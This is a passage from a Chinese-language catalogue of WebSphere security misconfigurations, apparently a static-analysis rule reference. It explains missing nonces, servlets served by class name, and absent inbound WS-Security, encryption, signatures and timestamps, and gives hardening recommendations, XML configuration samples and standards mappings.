<h5 id="RECOMMENDATIONS-215"><a href="#RECOMMENDATIONS-215" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>将应用程序配置为随 SOAP 消息一起发送 nonce。IBM WebSphere 部署描述符扩展文件的 integrity 和 confidentiality 部分中，应包含 <code>&lt;nonce&gt;</code> 标签。</p>
<h5 id="REFERENCES-214"><a href="#REFERENCES-214" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Web Services Handbook for WebSphere Application Server 6.1 IBM Redbooks</p>
<p>[2] Web Services Security Username Token Profile 1.0 OASIS</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 254</p>
<p>[4] Standards Mapping - FIPS200 CM</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.4</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.4</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.4</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000180 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000180 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000180 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[17] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[18] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="WebSphere-Misconfiguration-Servlets-Served-By-Class-Name"><a href="#WebSphere-Misconfiguration-Servlets-Served-By-Class-Name" class="headerlink" title="WebSphere Misconfiguration: Servlets Served By Class Name"></a>WebSphere Misconfiguration: Servlets Served By Class Name</h4><h5 id="ABSTRACT-216"><a href="#ABSTRACT-216" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>将应用程序配置为使 WebSphere 能够按照 Servlet 的类名为其提供服务。</p>
<h5 id="EXPLANATION-217"><a href="#EXPLANATION-217" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>允许按照 Servlet 的类名为其提供服务会使知道 Servlet 名称的任何攻击者能够直接调用它，即使没有在应用程序的部署描述符中映射它也是如此。</p>
<p>例如，考虑包含名为 com.ibm.websphere.samples.MyServlet 的 Servlet 的应用程序。当 ibm-web-ext.xmi 中的 serveServletsByClassnameEnabled（适用于 WAS V6 及更早版本）或 ibm-web-ext.xml 中的 enable-serving-servlets-by-class-name（自 WAS V7 起）设置为 true 时，可以通过请求以下内容来调用 servlet：<a href="http://www.example.com/SomeContextPath/servlet/com.ibm.websphere.samples.MyServlet。" target="_blank" rel="noopener">http://www.example.com/SomeContextPath/servlet/com.ibm.websphere.samples.MyServlet。</a></p>
<p>更糟糕的是，根据服务器的 classloader 结构，攻击者可能从驻留在相同 WebSphere 实例中的其他应用程序调用 Servlet。</p>
<h5 id="RECOMMENDATIONS-216"><a href="#RECOMMENDATIONS-216" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>应当禁止按照 Servlet 的类名来为其提供服务。通过将 ibm-web-ext.xmi 中的 serveServletsByClassnameEnabled（适用于 WAS V6 及更早版本）或 ibm-web-ext.xml 中的 enable-serving-servlets-by-class-name（自 WAS V7 起）设置为 false，可以实现此目的。</p>
<p>这是一种深入防御做法的建议，它和部署描述符不应包含到资源的一般映射的建议相同。</p>
<h5 id="REFERENCES-215"><a href="#REFERENCES-215" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Keys Botzum WebSphere Application Server V6 advanced security hardening – Part 1</p>
<p>[2] Standards Mapping - FIPS200 CM</p>
<p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-3 Access Enforcement (P1)</p>
<p>[4] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[5] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[6] Standards Mapping - OWASP Top 10 2007 A10 Failure to Restrict URL Access</p>
<p>[7] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[8] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10, Requirement 7.2</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.10, Requirement 7.2</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.8, Requirement 7.2</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8, Requirement 7.2</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8, Requirement 7.2</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8, Requirement 7.2</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3480.2 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3480.2 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3480.2 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3480.2 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3480.2 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3480.2 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3480.2 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-001870 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-001870 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-001870 CAT II</p>
<p>[25] Standards Mapping - Web Application Security Consortium Version 2.00 Server Misconfiguration (WASC-14)</p>
<h4 id="WebSphere-Service-Provider-Misconfiguration-Inbound-WS-Security-Not-Enabled"><a href="#WebSphere-Service-Provider-Misconfiguration-Inbound-WS-Security-Not-Enabled" class="headerlink" title="WebSphere Service Provider Misconfiguration: Inbound WS-Security Not Enabled"></a>WebSphere Service Provider Misconfiguration: Inbound WS-Security Not Enabled</h4><h5 id="ABSTRACT-217"><a href="#ABSTRACT-217" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>若服务提供程序不使用 WS-Security，则难以保证消息的完整性或保密性。</p>
<h5 id="EXPLANATION-218"><a href="#EXPLANATION-218" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>WS-Security 是 SOAP 的增强功能，无论采用何种传输协议，它都能提供端到端的消息完整性和保密性。不使用 WS-Security 时，将依靠传输安全性来保证消息的完整性和保密性。如果一项服务将消息转发到其他服务，则会使用中继点之间最薄弱的传输机制传送消息。WS-Security 可移除传输安全性 dependency，将其置于消息中。</p>
<p>若 IBM WebSphere WS-Security 服务器部署描述符扩展文件中缺少 <code>&lt;securityRequestConsumerServiceConfig&gt;</code> 标签，则表明未启用输入消息的安全性。</p>
<h5 id="RECOMMENDATIONS-217"><a href="#RECOMMENDATIONS-217" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>将该服务配置为使用 WS-Security。该配置应包含 <code>&lt;securityRequestConsumerServiceConfig&gt;</code>标签以及适当的安全令牌、时间戳、签名和加密标签。</p>
<h5 id="REFERENCES-216"><a href="#REFERENCES-216" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Web Services Handbook for WebSphere Application Server 6.1 IBM Redbooks</p>
<p>[2] Web Services Security SOAP Message Security 1.1 OASIS</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 254</p>
<p>[4] Standards Mapping - FIPS200 CM, SC</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[8] Standards Mapping - OWASP Top 10 2007 A9 Insecure Communications</p>
<p>[9] Standards Mapping - OWASP Top 10 2010 A9 Insufficient Transport Layer Protection</p>
<p>[10] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 4.1, Requirement 6.5.10</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.4</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.4</p>
<p>[17] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 319</p>
<p>[18] Standards Mapping - SANS Top 25 2010 Porous Defenses - CWE ID 311</p>
<p>[19] Standards Mapping - SANS Top 25 2011 Porous Defenses - CWE ID 311</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260.1 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000260 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000260 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000260 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[30] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[31] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="WebSphere-Service-Provider-Misconfiguration-Missing-Inbound-Encryption"><a href="#WebSphere-Service-Provider-Misconfiguration-Missing-Inbound-Encryption" class="headerlink" title="WebSphere Service Provider Misconfiguration: Missing Inbound Encryption"></a>WebSphere Service Provider Misconfiguration: Missing Inbound Encryption</h4><h5 id="ABSTRACT-218"><a href="#ABSTRACT-218" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>未加密的消息无法保护其保密性。</p>
<h5 id="EXPLANATION-219"><a href="#EXPLANATION-219" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>SOAP 消息级加密可确保真正的端到端保密性。可通过多种传输协议发送 SOAP 消息，例如 HTTPS、HTTP、TCP、SMTP、UDP 等。无论采用哪种传输协议，消息级加密都可确保消息的保密性。Web 服务之间的常见传送情形是在各种服务之间转发 SOAP 消息，因此通过消息级加密，消息发送者和接收者均无需担忧中继点之间的传输安全问题。</p>
<h5 id="RECOMMENDATIONS-218"><a href="#RECOMMENDATIONS-218" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>将服务配置为只接受加密的消息。通过启用“请求用户服务”配置中的保密性，便可完成此配置。</p>
<p>下面提供了 WebSphere 配置示例，将对输入的请求进行加密：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;com.ibm.etools.webservice.wsext:WsExtension xmi:version=&quot;2.0&quot; xmlns:xmi=&quot;http://www.omg.org/XMI&quot; xmlns:com.ibm.etools.webservice.wsext=&quot;http://www.ibm.com/websphere/appserver/schemas/5.0.2/wsext.xmi&quot; xmi:id=&quot;WsExtension_1152150731239&quot;&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">        &lt;securityRequestConsumerServiceConfig xmi:id=&quot;SecurityRequestConsumerServiceConfig_1211399165585&quot;&gt;</span><br><span class="line"></span><br><span class="line">          &lt;requiredConfidentiality xmi:id=&quot;RequiredConfidentiality_1211571304359&quot; name=&quot;xenc&quot; usage=&quot;Required&quot;&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;/com.ibm.etools.webservice.wsext:WsExtension&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-217"><a href="#REFERENCES-217" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Web Services Handbook for WebSphere Application Server 6.1 IBM Redbooks</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 311</p>
<p>[3] Standards Mapping - FIPS200 CM, SC</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A9 Insecure Communications</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A9 Insufficient Transport Layer Protection</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 4.1, Requirement 6.5.10</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.4</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.4</p>
<p>[16] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 319</p>
<p>[17] Standards Mapping - SANS Top 25 2010 Porous Defenses - CWE ID 311</p>
<p>[18] Standards Mapping - SANS Top 25 2011 Porous Defenses - CWE ID 311</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000260 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000260 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000260 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[29] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[30] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="WebSphere-Service-Provider-Misconfiguration-Missing-Inbound-Signature"><a href="#WebSphere-Service-Provider-Misconfiguration-Missing-Inbound-Signature" class="headerlink" title="WebSphere Service Provider Misconfiguration: Missing Inbound Signature"></a>WebSphere Service Provider Misconfiguration: Missing Inbound Signature</h4><h5 id="ABSTRACT-219"><a href="#ABSTRACT-219" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>缺少签名意味着无法保证 SOAP 消息的完整性。</p>
<h5 id="EXPLANATION-220"><a href="#EXPLANATION-220" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>消息中任何未经签名的部分，都可能在发送者或接收者未察觉的情况下被截取和修改。没有签名，接收者就无法借助密码来验证消息内容来自真正的发送者。</p>
<h5 id="RECOMMENDATIONS-219"><a href="#RECOMMENDATIONS-219" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>将该服务配置为对输入的请求验证签名。</p>
<p>下列服务提供程序配置可让 IBM WebSphere 验证输入请求的签名：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;com.ibm.etools.webservice.wsext:WsExtension xmi:version=&quot;2.0&quot; xmlns:xmi=&quot;http://www.omg.org/XMI&quot; xmlns:com.ibm.etools.webservice.wsext=&quot;http://www.ibm.com/websphere/appserver/schemas/5.0.2/wsext.xmi&quot; xmi:id=&quot;WsExtension_1152150731239&quot;&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">        &lt;securityRequestConsumerServiceConfig xmi:id=&quot;SecurityRequestConsumerServiceConfig_1211399165585&quot;&gt;</span><br><span class="line"></span><br><span class="line">          &lt;requiredIntegrity xmi:id=&quot;RequiredIntegrity_1212094350854&quot; name=&quot;int&quot; usage=&quot;Required&quot;&gt;</span><br><span class="line"></span><br><span class="line">            &lt;messageParts xmi:id=&quot;MessageParts_1212094350854&quot; Dialect=&quot;http://www.ibm.com/websphere/webservices/wssecurity/dialect-was&quot; keyword=&quot;body&quot;/&gt;</span><br><span class="line"></span><br><span class="line">            &lt;nonce xmi:id=&quot;Nonce_1212094350854&quot; Dialect=&quot;http://www.ibm.com/websphere/webservices/wssecurity/dialect-was&quot; keyword=&quot;body&quot;/&gt;</span><br><span class="line"></span><br><span class="line">          &lt;/requiredIntegrity&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;/com.ibm.etools.webservice.wsext:WsExtension&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-218"><a href="#REFERENCES-218" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Web Services Handbook for WebSphere Application Server 6.1 IBM Redbooks</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 345</p>
<p>[3] Standards Mapping - FIPS200 CM</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[7] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[8] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.4</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.4</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.4</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3260.1 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3860 CAT II, APP3260 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3860 CAT II, APP3260 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3860 CAT II, APP3260 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3860 CAT II, APP3260 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3860 CAT II, APP3260 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3860 CAT II, APP3260 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000180 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000180 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000180 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[23] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[24] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="WebSphere-Service-Provider-Misconfiguration-Missing-Inbound-Timestamp"><a href="#WebSphere-Service-Provider-Misconfiguration-Missing-Inbound-Timestamp" class="headerlink" title="WebSphere Service Provider Misconfiguration: Missing Inbound Timestamp"></a>WebSphere Service Provider Misconfiguration: Missing Inbound Timestamp</h4><h5 id="ABSTRACT-220"><a href="#ABSTRACT-220" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>若缺少时间戳，会导致 SOAP 消息遭受 replay 攻击。</p>
<h5 id="EXPLANATION-221"><a href="#EXPLANATION-221" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>安全性时间戳可表明消息的“新鲜性”。如果攻击者截取了一则消息，稍后将其转发，则接收者能够拒绝此 replay 攻击，因为时间戳会指明该消息已过期。时间戳可包含有效期属性，通过该属性，可对安全语义的有效期设置一个硬限制。</p>
<p>为避免攻击者篡改时间戳，应对时间戳执行签名。如果 SOAP 消息的时间戳未经签名，则攻击者可在接收者不知情的情况下截取该消息、修改时间戳，以及转发该消息。在这种情况下，攻击者可能会欺骗接收者接受恶意消息。</p>
<h5 id="RECOMMENDATIONS-220"><a href="#RECOMMENDATIONS-220" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>将服务配置为要求输入的请求具有时间戳。 下列 WebSphere 配置要求输入的 SOAP 请求具有时间戳：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;com.ibm.etools.webservice.wsext:WsExtension xmi:version=&quot;2.0&quot; xmlns:xmi=&quot;http://www.omg.org/XMI&quot; xmlns:com.ibm.etools.webservice.wsext=&quot;http://www.ibm.com/websphere/appserver/schemas/5.0.2/wsext.xmi&quot; xmi:id=&quot;WsExtension_1152150731239&quot;&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">        &lt;securityRequestConsumerServiceConfig xmi:id=&quot;SecurityRequestConsumerServiceConfig_1211399165585&quot;&gt;</span><br><span class="line"></span><br><span class="line">           ...</span><br><span class="line"></span><br><span class="line">           &lt;addTimestamp xmi:id=&quot;AddTimestamp_1211399165585&quot; expires=&quot;P3Y0M0DT4H0M0.0S&quot;/&gt;</span><br><span class="line"></span><br><span class="line">           ...</span><br><span class="line"></span><br><span class="line">&lt;/com.ibm.etools.webservice.wsext:WsExtension&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-219"><a href="#REFERENCES-219" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Web Services Handbook for WebSphere Application Server 6.1 IBM Redbooks</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 254</p>
<p>[3] Standards Mapping - FIPS200 CM</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[7] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[8] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.4</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.4</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.4</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3260.1 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3870 CAT I, APP3260 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3870 CAT I, APP3260 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3870 CAT I, APP3260 CAT II</p>
